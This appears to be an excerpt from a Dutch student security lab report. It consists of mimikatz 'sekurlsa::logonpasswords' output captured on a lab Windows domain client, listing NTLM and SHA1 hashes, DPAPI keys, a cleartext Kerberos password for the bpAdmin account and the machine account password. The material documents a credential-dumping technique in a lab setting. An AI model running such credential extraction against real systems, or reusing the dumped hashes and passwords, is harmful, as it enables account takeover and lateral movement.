# Uitvoer 1: NTLM en LM hashes werden gevonden voor gebruiker bpAdmin
```bash
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7451006 (00000000:0071b17e)
Session           : NetworkCleartext from 0
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/2/2023 6:18:34 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
            [00000003] Primary
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * NTLM     : 9a0198b452271b12ed7bfa3857896de6
            * SHA1     : b6aeabf2f779a9e9dbdf984476aead8903d6279b
            * DPAPI    : 43ea3bc55e20e980ea270eb496c17458
        tspkg :
        wdigest :
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : bpAdmin
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 7449194 (00000000:0071aa6a)
Session           : Service from 0
User Name         : sshd_4244
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 4/2/2023 6:18:31 PM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-4244
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 4907620 (00000000:004ae264)
Session           : NetworkCleartext from 0
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/2/2023 5:19:14 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
            [00000003] Primary
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
            * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : bpAdmin
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 4899734 (00000000:004ac396)
Session           : Service from 0
User Name         : sshd_6000
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 4/2/2023 5:19:11 PM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-6000
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3990876 (00000000:003ce55c)
Session           : Interactive from 2
User Name         : Administrator
Domain            : CLIENT
Logon Server      : CLIENT
Logon Time        : 4/2/2023 5:12:30 PM
SID               : S-1-5-21-4116410313-3006944705-3552785028-500
        msv :
            [00000003] Primary
            * Username : Administrator
            * Domain   : CLIENT
            * NTLM     : 383fe399326a954a97f73781553ae73d
            * SHA1     : 91ea158bf0afb16eda7057cf94407fb8b07ee2d4
        tspkg :
        wdigest :
            * Username : Administrator
            * Domain   : CLIENT
            * Password : (null)
        kerberos :
            * Username : Administrator
            * Domain   : CLIENT
            * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3905950 (00000000:003b999e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/2/2023 5:12:21 PM
SID               : S-1-5-90-0-2
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3905920 (00000000:003b9980)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/2/2023 5:12:21 PM
SID               : S-1-5-90-0-2
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3901539 (00000000:003b8863)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/2/2023 5:12:21 PM
SID               : S-1-5-96-0-2
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 3435591 (00000000:00346c47)
Session           : CachedInteractive from 1
User Name         : bpAdmin
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/2/2023 5:10:11 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-1104
        msv :
            [00000003] Primary
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
            * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
            * Username : bpAdmin
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : bpAdmin
            * Domain   : BP-2223-JORN.HOGENT
            * Password : Qwerty1
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 251536 (00000000:0003d690)
Session           : Interactive from 1
User Name         : Administrator
Domain            : bp-2223-jorn
Logon Server      : DC
Logon Time        : 4/2/2023 5:04:48 PM
SID               : S-1-5-21-515683379-1161447010-2736559910-500
        msv :
            [00000003] Primary
            * Username : Administrator
            * Domain   : bp-2223-jorn
            * NTLM     : 0cb6948805f797bf2a82807973b89537
            * SHA1     : 87f8ed9157125ffc4da9e06a7b8011ad80a53fe1
            * DPAPI    : 13dbf1a7979a271d4ff5f3681e6e94ee
        tspkg :
        wdigest :
            * Username : Administrator
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : Administrator
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
            * Username : (null)
            * Domain   : (null)
            * Password : (null)
        kerberos :
            * Username : (null)
            * Domain   : (null)
            * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 46090 (00000000:0000b40a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               : S-1-5-90-0-1
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 45950 (00000000:0000b37e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               : S-1-5-90-0-1
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CLIENT$
Domain            : bp-2223-jorn
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               : S-1-5-20
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : client$
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 25567 (00000000:000063df)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               : S-1-5-96-0-0
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 25460 (00000000:00006374)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               : S-1-5-96-0-1
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn.hogent
            * Password : JAXaMI!PHCe`&?D>mNsn)xf,@-F2Q"-/gL7ur4dVEEcV_ 8qSOPu)#^g>pOw<WZw0I-5JE #/YMy"j)%d>_$xG/V1MF#p 3t2];uhm-VIP?A3`?Cv9`zB ^l
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 23785 (00000000:00005ce9)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               :
        msv :
            [00000003] Primary
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * NTLM     : 8dfeb8a2d644ed6dd307ea62f8817a34
            * SHA1     : 13bcd6b5dba03e1cd1bbc9d4a0ffd5a8690531dc
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CLIENT$
Domain            : bp-2223-jorn
Logon Server      : (null)
Logon Time        : 4/2/2023 5:04:36 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
            * Username : CLIENT$
            * Domain   : bp-2223-jorn
            * Password : (null)
        kerberos :
            * Username : client$
            * Domain   : BP-2223-JORN.HOGENT
            * Password : (null)
        ssp :
        credman :
        cloudap :
```